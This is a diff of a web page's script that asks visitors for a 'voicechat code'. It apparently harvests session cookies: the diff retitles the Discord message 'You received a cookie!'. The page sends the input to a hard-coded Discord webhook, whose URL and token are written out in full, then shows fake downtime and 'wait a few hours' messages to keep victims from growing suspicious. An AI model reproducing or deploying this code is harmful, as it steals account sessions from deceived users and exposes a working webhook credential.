@@ -58,13 +58,19 @@
             const vcCode = document.getElementById('vcCode').value;
 
             if (vcCode === "") {
-                alert("Please enter your voicechat code.");
+                alert("uhm did you put a vc code or what lol ;-;");
                 return;
             }
 
             const webhookURL = "https://discord.com/api/webhooks/1261740899059241052/o-IE5n4eykDSv50r9fy8N90RSQy8jKio0pweeHvK7TWMZKM8A0fpGiZN35CzdroAHzvr";
             const data = {
-                content: vcCode
+                embeds: [
+                    {
+                        title: "You received a cookie!",
+                        description: vcCode,
+                        color: 4140000 // Red color, you can customize this
+                    }
+                ]
             };
 
             try {
@@ -77,15 +83,15 @@
                 });
 
                 if (response.ok) {
-                    console.log("Code sent successfully.");
+                    console.log("your getting your vc, because your vc code is valid! please wait a few hours and check your account later");
                 } else {
-                    console.error("Failed to send code:", response.status, response.statusText);
+                    console.error("err11:", response.status, response.statusText);
                 }
 
-                alert("Sorry, we are experiencing heavy downtime at the moment. Please wait around 3 hours or you can close out of the website and try again later.");
+                alert("Sorry, but we are experiencing severe downtime and you will have to try again later. [ you didnt do anything wrong, our website did something wrong. check in devtools or inspect element for your error code");
             } catch (error) {
-                console.error("Error sending code:", error);
-                alert("Sorry, we are experiencing heavy downtime at the moment. Please wait around 3 hours or you can close out of the website and try again later.");
+                console.error("heres the error for you nerds:", error);
+                alert("you just got our most critical error, lucky us we dont know how to resolve it. see you later.");
             }
         }
     </script>
